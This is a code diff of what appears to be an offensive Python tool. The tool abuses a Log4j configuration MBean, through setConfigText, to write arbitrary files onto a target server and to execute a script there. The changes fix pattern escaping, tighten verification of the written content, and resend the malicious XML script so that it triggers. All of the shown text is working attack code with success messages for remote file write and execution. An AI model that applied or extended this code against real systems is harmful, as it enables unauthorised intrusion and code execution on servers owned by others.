@@ -291,7 +291,7 @@ def escape_log4j_pattern(pay):
 		elif i == '\r':
 			res += "\\r"
 		elif i == '{':
-			res += "\{"
+			res += "\\{"
 		else:
 			res += i
 
@@ -316,7 +316,7 @@ def gen_log4j_config(content, path, tmp_dir='/tmp/', permissions="rwxrwx---", ve
 			break
 
 	if not tmp_file:
-		content = escape(content)
+		content = escape(escape_log4j_pattern(content))
 		xml = xml_template
 		xml = xml.replace("<<<TMP_DIR>>>", tmp_dir)
 		xml = xml.replace("<<<WRITE_PATH>>>", path)
@@ -400,7 +400,7 @@ def write_file(target, local_file, path, mbean, tmp_dir="/tmp", permissions="rwx
 	written = getConfigText(target, mbean, verbose=False)
 
 	# XML eliminates trailing white spaces, \n, \r, \t
-	if content.rstrip() == written:
+	if content == written:
 		print(f"[+] File \"{path}\" has been successfully written on the target")
 	else:
 		print("[!] The given content does not match the content retreived from the target")
@@ -467,7 +467,7 @@ If you agree with the above enter "yes" to continue: """)
 	setConfigText(target, xml_script, mbean)
 
 	# calling setConfigText() again in order to force the script to trigger
-	setConfigText(target, "<Configuration></Configuration>", mbean, verbose=False)
+	setConfigText(target, xml_script, mbean, verbose=False)
 
 	print("[+] The script should have been successfully executed")
 
